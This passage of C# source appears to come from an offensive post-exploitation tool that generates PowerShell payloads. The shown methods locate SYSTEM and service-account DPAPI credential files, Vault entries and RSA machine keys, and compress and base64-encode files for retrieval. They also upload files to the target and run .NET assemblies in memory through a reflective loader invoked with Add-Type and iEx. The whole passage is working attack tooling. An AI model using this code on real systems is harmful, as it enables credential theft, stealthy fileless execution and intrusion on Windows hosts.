$output = New-Object System.IO.MemoryStream
$Stream = New-Object IO.Compression.GZipStream([IO.MemoryStream][Convert]::FromBase64String($b64),[IO.Compression.CompressionMode]::Decompress)
$Stream.CopyTo($output)
$data = [System.Text.Encoding]::utf8.GetString($output.ToArray())
add-type -Language CSharp $data

[ConsoleApp1.Program]::DelegWalk('{1}')
";
            return String.Format(function, csFile, Convert.ToBase64String(Encoding.Unicode.GetBytes(command)));
        }

        public static string FindSystemCred()
        {
            return @"
((@(""$env:SystemRoot\\System32\\config\\systemprofile\\AppData\\Local\\Microsoft\\Credentials"",
""$env:SystemRoot\\System32\\config\\systemprofile\\AppData\\Roaming\\Microsoft\\Credentials"",
""$env:SystemRoot\\ServiceProfiles\\LocalService\\AppData\\Local\\Microsoft\\Credentials"",
""$env:SystemRoot\\ServiceProfiles\\LocalService\\AppData\\Roaming\\Microsoft\\Credentials"",
""$env:SystemRoot\\ServiceProfiles\\NetworkService\\AppData\\Local\\Microsoft\\Credentials"",
""$env:SystemRoot\\ServiceProfiles\\NetworkService\\AppData\\Roaming\\Microsoft\\Credentials"") | where{test-path $_}) | get-Childitem -force).fullname | where{$_}
";
        }

        public static string FindSystemVault()
        {
            return @"
((@(""$env:SystemRoot\System32\config\systemprofile\AppData\Local\Microsoft\Vault"",
""$env:SystemRoot\System32\config\systemprofile\AppData\Roaming\Microsoft\Vault"",
""$env:SystemRoot\ServiceProfiles\LocalService\AppData\Local\Microsoft\Vault"",
""$env:SystemRoot\ServiceProfiles\LocalService\AppData\Roaming\Microsoft\Vault"",
""$env:SystemRoot\ServiceProfiles\NetworkService\AppData\Local\Microsoft\Vault"",
""$env:SystemRoot\ServiceProfiles\NetworkService\AppData\Roaming\Microsoft\Vault"") | where{test-path $_}) | get-Childitem -force).fullname | where{$_ -match ""[0-9A-Fa-f]{8}[-][0-9A-Fa-f]{4}[-][0-9A-Fa-f]{4}[-][0-9A-Fa-f]{4}[-][0-9A-Fa-f]{12}""}
";
        }

        public static string FindSystemCert()
        {
            return @"
((@(""$env:SystemDrive\\ProgramData\\Microsoft\\Crypto\\RSA\\MachineKeys"",
""$env:SystemDrive\\Windows\\ServiceProfiles\\LocalService\\AppData\\Roaming\\Microsoft\\Crypto\\RSA"",
""$env:SystemDrive\\Users\\All Users\\Application Data\\Microsoft\\Crypto\\RSA\\MachineKeys"") | where{test-path $_}) | get-Childitem -force).fullname | where{$_}
";
        }

        public static string CopyFile(string path)
        {
            return String.Format(@"
$Path = Resolve-Path '{0}'
if (![IO.File]::Exists($Path)){{return $false}}
$FileBytes = [System.IO.File]::ReadAllBytes($Path)
$Length = $FileBytes.Length
$CompressedStream = New-Object IO.MemoryStream
$GZipStream = New-Object IO.Compression.GZipStream ($CompressedStream, [IO.Compression.CompressionMode]::Compress)
$GZipStream.Write($FileBytes, 0, $FileBytes.Length)
$GZipStream.Dispose()
$CompressedFileBytes = $CompressedStream.ToArray()
$CompressedStream.Dispose()
[Convert]::ToBase64String($CompressedFileBytes)
", path);
        }

        public static string UploadFile(string data, string path)
        {
            return String.Format(@"
$b64 = '{0}'
$bytes = [Convert]::FromBase64String($b64)
$output = New-Object System.IO.MemoryStream
$Stream = New-Object IO.Compression.GZipStream([IO.MemoryStream]$bytes,[IO.Compression.CompressionMode]::Decompress)
$Stream.CopyTo($output)
[io.file]::WriteAllBytes('{1}', $output.ToArray())
", data, path);
        }

        public static string DecompressData(string data)
        {
            return String.Format(@"
$b64 = '{0}'
$output = New-Object System.IO.MemoryStream
$Stream = New-Object IO.Compression.GZipStream([IO.MemoryStream][Convert]::FromBase64String($b64),[IO.Compression.CompressionMode]::Decompress)
$Stream.CopyTo($output)
$data = [System.Text.Encoding]::ASCII.GetString($output.ToArray())
", data);
        }

        public static string ExecuteAssembly(string path, string arguments)
        {
            string file = Compress(File.ReadAllBytes(path));
            byte[] bytes = File.ReadAllBytes(path);
            string template;

            if (String.IsNullOrEmpty(arguments))
            {
                arguments = "";
            }

            template = string.Format(@"
$Code= @'
using System;
using System.IO;
using System.IO.Compression;
using System.Linq;
using System.Reflection;
namespace Loader
{{
    public static class Program
    {{

        public static byte[] Decompress(byte[] data)
        {{
            using (var compressedStream = new MemoryStream(data))
            using (var zipStream = new GZipStream(compressedStream, CompressionMode.Decompress))
            using (var resultStream = new MemoryStream())
            {{
                zipStream.CopyTo(resultStream);
                return resultStream.ToArray();
            }}
        }}

        public static string LoadAssembly(string[] args)
        {{
            
	        TextWriter realStdOut = Console.Out;
            TextWriter realStdErr = Console.Error;
            TextWriter stdOutWriter = new StringWriter();
            TextWriter stdErrWriter = new StringWriter();
            Console.SetOut(stdOutWriter);
            Console.SetError(stdErrWriter);
	        
			byte[] bin = Decompress(Convert.FromBase64String(""{0}""));
			Assembly a = Assembly.Load(bin);
			try
			{{
				a.EntryPoint.Invoke(null, new object[]
                {{
                    args.Skip(1).ToArray<string>()
                }});
			}}
			catch
			{{
				MethodInfo method = a.EntryPoint;
				if (method != null)
				{{
					object o = a.CreateInstance(method.Name);
					method.Invoke(o, null);
				}}
			}}
                
            Console.Out.Flush();
            Console.Error.Flush();
            Console.SetOut(realStdOut);
            Console.SetError(realStdErr);
    
            string output = """";
            output += stdOutWriter.ToString();
            output += stdErrWriter.ToString();
            return output;            

        }}
	}}
}}
'@
Add-Type -Language CSharp -TypeDefinition $code
[array]$arg = @'
null {1}
'@.split()
", file, arguments);
            return String.Format(@"
{0}
iEx $data
$([Loader.Program]::LoadAssembly($arg) | out-string)
", DecompressData(Misc.CompressData(template)));
        }
    }
}